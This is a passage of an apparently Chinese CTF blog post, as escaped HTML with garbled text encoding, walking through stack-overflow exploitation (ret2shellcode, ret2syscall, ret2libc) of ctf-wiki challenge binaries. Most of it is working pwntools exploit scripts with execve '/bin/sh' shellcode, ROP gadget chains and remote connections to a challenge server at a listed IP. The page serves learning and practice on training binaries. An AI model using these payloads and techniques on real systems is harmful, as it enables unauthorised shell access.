&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding:utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level = &amp;#39;debug&amp;#39;,arch =&amp;#39;x64&amp;#39;,os = &amp;#39;linux&amp;#39; )&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./shellcode&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = remote(&amp;#34;47.106.212.155&amp;#34;,10003)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shellcode&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;[&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;]&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">drop&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># print(buf_addr)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">24&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf_addr&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">shellcode&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 32æ˜¯24å­—èŠ‚çš„å¡«å……æ•°æ®é•¿åº¦åŠ è¿”å›åœ°å€é•¿åº¦24+8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span> &lt;span class="n">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ret2syscall">ret2syscall&lt;/h3>
&lt;p>æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop" target="_blank" rel="noopener"
>ret2syscall&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407152204.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407152706.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>ç›¸å¯¹ebpçš„åç§»ä¸º0x64=108 è¦†ç›–èŒƒå›´ä¸º+4=112&lt;/p>
&lt;p>æ²¡æ³•ret2text,ä¹Ÿæ²¡æ³•ret2shellcode&lt;/p>
&lt;p>åªæœ‰ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨æ¥getshellã€‚æ‰§è¡Œ int 0x80å³å¯æ‰§è¡Œå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plain" data-lang="plain">&lt;span class="line">&lt;span class="cl">execve(&amp;#34;/bin/sh&amp;#34;,NULL,NULL)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ä½¿ç”¨ROPgadgetå¯»æ‰¾gadgets&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407155958.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>è¿™æ ·å°±èƒ½å¤Ÿæ§åˆ¶åˆ°eax,ebx,ecx,edxå¯„å­˜å™¨ã€‚&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>å†™payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#coding:utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># context(log_level = &amp;#39;debug&amp;#39;,arch =&amp;#39;i386&amp;#39;,os = &amp;#39;linux&amp;#39; )&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(./ret2syscall)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10004&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_eax_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x080bb196&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_ebcdx_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0806eb90&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">int_0x80_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08049421&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bin_sh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x080BE408&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">(&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pop_eax_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pop_ebcdx_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">bin_sh_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">int_0x80_addr&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="ret2libc">ret2libc&lt;/h3>
&lt;p>ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚&lt;/p>
&lt;p>eg1: &lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener"
>ret2libc1&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407175007.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__cdecl&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [esp+1Ch] [ebp-64h]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setvbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">stdout&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">setvbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;RET2LIBC &amp;gt;_&amp;lt;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">gets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407175502.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20190407175715.png"
loading="lazy"
alt="img"
>&lt;/p>
&lt;p>exp1:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./ret2libc1&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10006&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048720&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_plt_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048460&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_plt_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;b&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">binsh_addr&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># &amp;#39;bbbb&amp;#39; ä½œä¸ºå‡½æ•°è°ƒç”¨æ ˆè¿”å›åœ°å€çš„è™šå‡çš„åœ°å€&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;hr>
&lt;p>eg2:&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener"
>ret2libc2&lt;/a>&lt;/p>
&lt;p>ç¼ºå°‘/bin/sh åªèƒ½è‡ªå·±å¯»æ‰¾gadgetsæ¥è¿›è¡Œæ„é€ ã€‚&lt;/p>
&lt;p>exp:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./ret2libc2&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;47.106.212.155&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">10007&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># binsh_addr = 0x08048720&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_plt_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048490&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sym_imp_gets_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x08048460&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_ebx_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0804872f&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">buf2_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x804a080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">flat&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="s2">&amp;#34;A&amp;#34;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">112&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_imp_gets_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">pop_ebx_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">buf2_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">sym_plt_addr&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;x&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">buf2_addr&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>eg3:&lt;/p>
&lt;p>&lt;a class="link" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3" target="_blank" rel="noopener"
>ret2libc3&lt;/a>&lt;/p>
&lt;p>2çš„åŸºç¡€ä¸Šå»æ‰äº†systemçš„åœ°å€ã€‚&lt;/p>
&lt;p>got è¡¨æ³„éœ²libcçš„å‡½æ•°åœ°å€&lt;/p>
&lt;p>åˆ©ç”¨æ€è·¯ï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>æ³„éœ² __libc_start_main åœ°å€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å– libc ç‰ˆæœ¬&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€&lt;/p>
&lt;/li>
&lt;li>
&lt;p>å†æ¬¡æ‰§è¡Œæºç¨‹åº&lt;/p>
&lt;/li>
&lt;li>
&lt;p>è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system(â€˜/bin/shâ€™)&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>exp:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">LibcSearcher&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">LibcSearcher&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">log_level&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;debug&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;i386&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">os&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;linux&amp;#39;&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># io = process(&amp;#39;./ret2libc3&amp;#39;)&lt;/span>
